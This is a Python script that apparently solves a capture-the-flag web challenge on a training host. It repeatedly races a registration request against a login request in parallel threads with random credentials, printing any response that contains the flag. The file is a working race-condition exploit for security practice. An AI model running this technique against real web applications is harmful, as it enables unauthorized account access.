import string
import requests
import random
import threading
import time


baseurl = "http://aart.training.jinblack.it"


def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def login(session, username, password):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password}
    r = session.post(url, data=data)
    if "flag" in r.text:
        print(r.text)
    return r.text


def register(session, username, password):
    url = "%s/register.php" % baseurl
    data = {"username": username, "password": password}
    r = session.post(url, data=data)
    return r.text


while True:
    s = requests.Session()
    u = randomString()
    p = randomString()

    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()
    print(u, p)

    t1.join()
    t2.join()
    time.sleep(0.1)
